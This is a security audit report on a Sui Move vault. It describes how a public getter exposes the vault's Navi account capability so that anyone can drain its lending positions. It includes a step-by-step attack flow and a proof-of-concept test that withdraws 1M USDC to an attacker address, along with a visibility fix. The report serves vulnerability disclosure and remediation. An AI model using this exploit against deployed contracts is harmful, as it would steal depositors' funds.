# Audit Report

## Title
Public AccountCap Exposure Enables Complete Bypass of Vault Locking Window and Withdrawal Security

## Summary
The vault's `get_defi_asset` function is declared as public with zero authorization checks, allowing any attacker to obtain an immutable reference to the vault's NaviAccountCap. This reference can be passed to the Navi protocol's public `incentive_v3::withdraw_with_account_cap` function to drain all funds from the vault's Navi lending positions, completely bypassing the vault's 12-hour locking window, withdrawal request system, share burning, and all other security mechanisms.

## Finding Description

The vulnerability exists due to a dangerous combination of two public functions that together enable unauthorized fund theft:

**First vulnerability component:** The vault's `get_defi_asset` function is declared as `public fun` with no authorization checks. [1](#0-0) 

This function allows any external address to obtain an immutable reference (`&AssetType`) to any DeFi asset stored in the vault's `assets: Bag`, including the critical NaviAccountCap that controls the vault's Navi lending positions. The asset key is deterministic and can be computed by any attacker using the public `parse_key` function. [2](#0-1) 

**Second vulnerability component:** The Navi protocol's `incentive_v3::withdraw_with_account_cap` function is also declared as `public fun` and accepts an AccountCap reference to perform withdrawals. [3](#0-2) 

This function extracts the owner address from the AccountCap, updates reward states, and calls the underlying `lending::withdraw_with_account_cap` to perform the actual withdrawal. [4](#0-3) 

The lending core's withdrawal implementation updates the account owner's (vault's) supply balance in Storage, then calls `pool::withdraw_balance` which extracts the funds from the Pool and **returns the Balance directly to whoever called the function** (the attacker). [5](#0-4) [6](#0-5) 

**Attack execution flow:**
1. Attacker computes the asset key: `vault_utils::parse_key<NaviAccountCap>(0)`
2. Attacker calls `vault.get_defi_asset<CoinType, NaviAccountCap>(asset_key)` to obtain `&AccountCap`
3. Attacker calls `incentive_v3::withdraw_with_account_cap(clock, oracle, storage, pool, asset, amount, incentive_v2, incentive_v3, &AccountCap)` to receive `Balance<CoinType>`
4. Attacker converts Balance to Coin and transfers to their address

**Bypassed security mechanisms:**

The vault's legitimate withdrawal flow enforces critical security checks that are completely circumvented by this attack. The vault never validates the withdrawal, never burns shares, never collects fees, and never enforces any locking windows or request requirements. All vault accounting and security mechanisms exist in a different code path that is never reached when using the AccountCap directly.

## Impact Explanation

**Critical Fund Theft:** An attacker can steal 100% of the funds deposited into Navi lending positions through the vault's NaviAccountCap without owning any vault shares or requiring any authorization. The attack has no upper bound - if the vault has $10M in Navi positions, all $10M can be stolen in a single transaction.

**Bypassed Security Layers:**
- **Locking window**: The withdrawal delay mechanism is completely bypassed - instant theft is possible
- **Request system**: No withdrawal request or request ID validation occurs
- **Share accounting**: Attacker doesn't need vault shares; the vault's shares remain outstanding but are now backed by nothing
- **Fee collection**: Withdrawal fees are never collected
- **Access control**: Zero authorization checks whatsoever

**Vault State Corruption:** The vault's share supply remains unchanged while the underlying Navi position value drops to zero, causing severe undercollateralization. All legitimate depositors experience 100% loss of their proportional Navi position value while their share balances remain the same - the shares become worthless.

**Severity Justification:** CRITICAL - This represents direct theft of custody with no special privileges required, no attack preconditions beyond the vault having Navi positions (a core feature), and trivial execution complexity.

## Likelihood Explanation

**Attacker Profile:** Any external address with basic blockchain interaction capability can execute this attack. No operator role, admin privileges, vault shares, or specialized knowledge required.

**Attack Complexity:** Trivially simple - requires exactly two public function calls with readily available parameters. The NaviAccountCap is stored in a deterministic location using a predictable key format that can be computed with the public `parse_key` function. [7](#0-6) 

**Preconditions:** Only requires that the vault has created Navi lending positions, which is a core feature of the vault system. This is a normal operational state demonstrated throughout the test suite. [8](#0-7) 

**Detection Difficulty:** The attack appears as normal Navi protocol withdrawals at the Navi layer, making real-time prevention nearly impossible. Only post-hoc vault reconciliation would reveal the missing funds.

**Probability Assessment:** HIGH - The exploit path is straightforward with guaranteed success. Both functions are unconditionally public, accept the correct parameter types (immutable references), and have no authorization barriers. The vulnerability is actively exploitable in the current codebase.

## Recommendation

**Immediate Fix:** Change the visibility of `get_defi_asset` from `public fun` to `public(package) fun` to restrict access to within the vault package only:

```move
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

This prevents external callers from obtaining references to sensitive DeFi assets like NaviAccountCap, SuilendObligationOwnerCap, and other position controllers.

**Additional Hardening:** Review all other public functions that return references to internal vault assets to ensure they don't expose similar attack vectors.

## Proof of Concept

```move
#[test]
public fun test_steal_navi_funds_via_accountcap_exposure() {
    let mut scenario = test_scenario::begin(ATTACKER);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup: Initialize vault with Navi position (normal operation)
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<USDC>(&mut scenario);
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<USDC>>();
        let operation = scenario.take_shared<Operation>();
        let cap = scenario.take_from_sender<OperatorCap>();
        
        // Vault creates Navi position
        let navi_account_cap = lending::create_account(scenario.ctx());
        operation::add_new_defi_asset(&operation, &cap, &mut vault, 0, navi_account_cap);
        
        // Vault deposits funds into Navi (e.g., 1M USDC)
        // ... deposit logic ...
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        scenario.return_to_sender(cap);
    };
    
    // Attack: External attacker steals all funds
    scenario.next_tx(ATTACKER);
    {
        let vault = scenario.take_shared<Vault<USDC>>();
        let mut storage = scenario.take_shared<Storage>();
        let mut pool = scenario.take_shared<Pool<USDC>>();
        let oracle = scenario.take_shared<PriceOracle>();
        let mut incentive_v2 = scenario.take_shared<IncentiveV2>();
        let mut incentive_v3 = scenario.take_shared<IncentiveV3>();
        
        // Step 1: Get vault's NaviAccountCap reference (PUBLIC, NO AUTH)
        let asset_key = vault_utils::parse_key<NaviAccountCap>(0);
        let account_cap_ref = vault.get_defi_asset<USDC, NaviAccountCap>(asset_key);
        
        // Step 2: Withdraw vault's funds directly (PUBLIC, NO AUTH)
        let stolen_balance = incentive_v3::withdraw_with_account_cap<USDC>(
            &clock, &oracle, &mut storage, &mut pool, 
            0, // asset ID
            1_000_000_000000, // 1M USDC
            &mut incentive_v2, &mut incentive_v3, 
            account_cap_ref // Vault's AccountCap!
        );
        
        // Step 3: Convert and transfer stolen funds
        let stolen_coin = coin::from_balance(stolen_balance, scenario.ctx());
        transfer::public_transfer(stolen_coin, ATTACKER);
        
        // Vault's Navi position is now drained, shares are worthless
        test_scenario::return_shared(vault);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(oracle);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

## Notes

This vulnerability demonstrates a critical principle in Sui Move security: **public functions that return references to capability objects must be carefully scoped**. The `get_defi_asset` function was likely intended for internal vault operations and adaptors, but being declared as `public fun` makes it callable by any external address. Combined with the Navi protocol's public `withdraw_with_account_cap` function (which legitimately needs to be public for its own integrations), this creates a complete bypass of all vault security.

The fix is straightforward - changing visibility to `public(package) fun` restricts access to the vault package while maintaining the necessary functionality for legitimate internal operations.

### Citations

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/sources/utils.move (L14-20)
```text
public fun parse_key<T>(idx: u8): AsciiString {
    let type_name_string_ascii = type_name::get<T>().into_string();
    let mut type_name_string = string::from_ascii(type_name_string_ascii);

    type_name_string.append(idx.to_string());
    type_name_string.to_ascii()
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L853-869)
```text
    public fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        lending::withdraw_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount, account_cap)
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L216-248)
```text
    fun base_withdraw<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        user: address
    ): Balance<CoinType> {
        storage::when_not_paused(storage);
        storage::version_verification(storage);

        let normal_withdraw_amount = pool::normal_amount(pool, amount);
        let normal_withdrawable_amount = logic::execute_withdraw<CoinType>(
            clock,
            oracle,
            storage,
            asset,
            user,
            (normal_withdraw_amount as u256)
        );

        let withdrawable_amount = pool::unnormal_amount(pool, normal_withdrawable_amount);
        let _balance = pool::withdraw_balance(pool, withdrawable_amount, user);
        emit(WithdrawEvent {
            reserve: asset,
            sender: user,
            to: user,
            amount: withdrawable_amount,
        });

        return _balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L494-504)
```text
    public(friend) fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        base_withdraw(clock, oracle, storage, pool, asset, amount, account::account_owner(account_cap))
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/pool.move (L125-140)
```text
    public(friend) fun withdraw_balance<CoinType>(pool: &mut Pool<CoinType>, amount: u64, user: address): Balance<CoinType> {
        if (amount == 0) {
            let _zero = balance::zero<CoinType>();
            return _zero
        };

        let _balance = balance::split(&mut pool.balance, amount);
        emit(PoolWithdraw {
            sender: user,
            recipient: user,
            amount: amount,
            pool: type_name::into_string(type_name::get<CoinType>()),
        });

        return _balance
    }
```

**File:** volo-vault/tests/update/assets.test.move (L37-44)
```text
        let navi_account_cap = lending::create_account(s.ctx());
        operation::add_new_defi_asset(
            &operation,
            &cap,
            &mut vault,
            0,
            navi_account_cap,
        );
```

**File:** volo-vault/tests/update/assets.test.move (L55-56)
```text
        let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        assert!(vault.contains_asset_type(navi_asset_type));
```
